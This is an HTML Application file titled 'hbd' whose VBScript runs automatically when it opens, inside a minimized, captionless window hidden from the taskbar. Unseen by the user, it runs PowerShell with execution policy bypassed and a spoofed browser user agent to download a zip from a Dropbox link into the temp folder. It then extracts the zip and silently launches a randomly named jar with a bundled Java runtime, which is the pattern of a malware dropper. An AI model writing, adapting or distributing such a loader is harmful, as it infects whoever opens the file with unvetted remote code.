<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<hta:application
  id="oHTA"
  applicationname="hbd_launch"
  border="none"
  caption="no"
  showintaskbar="no"
  scroll="no"
  singleinstance="yes"
  windowstate="minimize"
/>
<title>hbd</title>
</head>
<script language="VBScript">
Option Explicit

Dim fso, shell

Sub Window_OnLoad
  Dim url, workDir, zipPath, extractDir, jarPath, javaExe, ps

  On Error Resume Next
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set shell = CreateObject("WScript.Shell")
  If Err.Number <> 0 Then
    MsgBox "baslatma hatasi: " & Err.Description, 16, "hbd"
    window.close
    Exit Sub
  End If
  On Error GoTo 0

  url = "https://www.dropbox.com/scl/fi/7oq2u4xqrevdi5je76nrn/HBD-XIRY_bundle2.zip?rlkey=biszp3hd5y31zkn8eb889ct4o&st=3mhws1gd&dl=1"

  workDir = shell.ExpandEnvironmentStrings("%TEMP%") & "\hbd_xiry"
  zipPath = workDir & "\bundle.zip"
  extractDir = workDir & "\ext"

  EnsureFolder workDir
  EnsureFolder extractDir

  ps = "powershell -NoProfile -ExecutionPolicy Bypass -Command """ & _
       "$ProgressPreference='SilentlyContinue';" & _
       "Invoke-WebRequest -Uri '" & url & "' -OutFile '" & zipPath & "' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36' -UseBasicParsing;" & _
       "Expand-Archive -LiteralPath '" & zipPath & "' -DestinationPath '" & extractDir & "' -Force" & """"

  shell.Run ps, 0, True

  jarPath = FindFile(extractDir, "i8qa6chuqe37h7yz.jar")
  javaExe = FindFile(extractDir, "javaw.exe")

  If jarPath = "" Then
    MsgBox "jar bulunamadi: i8qa6chuqe37h7yz.jar", 16, "hbd"
    window.close
    Exit Sub
  End If
  If javaExe = "" Then
    MsgBox "javaw.exe bulunamadi", 16, "hbd"
    window.close
    Exit Sub
  End If

  shell.Run """" & javaExe & """ -jar """ & jarPath & """", 0, False

  window.close
End Sub

Sub EnsureFolder(p)
  On Error Resume Next
  If Not fso.FolderExists(p) Then fso.CreateFolder p
  On Error GoTo 0
End Sub

Function FindFile(folderPath, fileName)
  Dim folder, f, sf, r
  On Error Resume Next
  Set folder = fso.GetFolder(folderPath)
  If Err.Number <> 0 Then
    FindFile = ""
    Exit Function
  End If
  On Error GoTo 0
  For Each f In folder.Files
    If LCase(f.Name) = LCase(fileName) Then
      FindFile = f.Path
      Exit Function
    End If
  Next
  For Each sf In folder.SubFolders
    r = FindFile(sf.Path, fileName)
    If r <> "" Then
      FindFile = r
      Exit Function
    End If
  Next
  FindFile = ""
End Function
</script>
<body>
</body>
</html>
